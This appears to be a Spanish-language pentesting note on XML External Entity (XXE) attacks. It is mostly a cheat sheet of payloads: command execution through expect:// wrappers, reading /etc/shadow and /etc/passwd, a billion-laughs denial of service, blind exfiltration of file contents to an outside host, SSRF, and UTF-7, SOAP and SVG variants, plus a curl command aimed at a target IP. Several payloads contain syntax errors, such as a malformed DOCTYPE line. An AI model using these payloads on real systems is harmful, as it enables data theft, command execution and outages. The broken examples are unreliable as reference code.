Una de las vulnerabilides web más importantes referidas a XML es XXE. XML Exernal Entity es una vulnerabilidad que pueden tener los servidores web que reciben valores de entrada en formato XML. En muchas ocasiones, estos servidores hacer uso de librerías como "parserxml"  para parsear el contenido.

El ataque XXE consiste en la manipulación de un fichero xml malicioso que al ser parseado nos brinde un acceso al ejecutar comandos.

El ataque XXE es un tipo de ataque contra una aplicación web que parsea entradas xml. Esto ocurre cuando la entrada contiene una referencia a una entidad externa que es procesada por una débil configuración. Este ataque podría permitir la exposición de datos confidenciales, DoS, SSRF (Server Side Request Forgery), escaneo de puertos desde la perspectiva de la máquina donde el parser está localizado, etc.

Para probar el servidor web de una máquina objetivo para ver si procesa los ficheros xml, podemos enviarle como prueba inicial un fichero test.txt con una estructura xml en su interior. Utilizando curl podemos enviarlo mediante una solicitud POST:
`curl -d @test.txt http://10.10.10.98/hosts.php`

Fichero xml malicioso:
``` XML
<?xml version="1.0" encoding="ISO-8859-1">
>!DOCTYPE foo [ <!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "expect://id" >] >
<details>
	<subnet_mask>&xxe;</subnet_mask>
	<test></test>
</details>
```

** Otros wrappers para ejecutar comandos **
XXE: Basic XML Example

``` XML
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

XXE: Entity Example

```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

XXE: File Disclosure

``` XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

XXE: Denial-of-Service Example

``` XML
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

)XXE: Local File Inclusion Example

``` XML
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)

``` XML
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```

XXE: Access Control Bypass (Loading Restricted Resources - PHP example)

``` XML
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

XXE:SSRF ( Server Side Request Forgery ) Example

``` XML
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

XXE: (Remote Attack - Through External Xml Inclusion) Exmaple

``` XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz><lol>3..2..1...&test<lol></lolz>
```

XXE: UTF-7 Exmaple

``` XML
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

XXE: Base64 Encoded

``` XML
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

XXE: XXE inside SOAP Example

``` XML
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

XXE: XXE inside SVG
 
``` XML
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```